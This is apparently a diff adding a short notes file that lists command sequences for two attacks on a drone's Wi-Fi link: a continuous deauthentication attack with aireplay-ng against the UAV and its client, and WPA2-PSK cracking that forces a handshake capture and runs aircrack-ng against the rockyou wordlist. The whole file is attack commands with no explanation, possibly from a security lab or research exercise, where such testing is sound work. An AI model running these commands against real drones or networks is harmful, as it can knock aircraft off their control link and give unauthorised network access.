@@ -1,0 +1,12 @@
+Wi-Fi Deauthentication Attack
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0
+sudo airodump-ng -d (uav MAC address) -c (channel) wlan0
+sudo aireplay-ng -0 0 -a (uav MAC address) -c (client MAC address) wlan0
+
+WPA2-PSK Wi-Fi Cracking Attack
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0
+sudo airodump-ng --bssid (uav MAC address) (channel) --write WPAcrack_attack_130921 wlan0
+sudo aireplay-ng --deauth 100 -a (uav MAC address) wlan0
+sudo aircrack-ng WPAcrack-01.cap -w /usr/share/wordlists/rockyou.txt
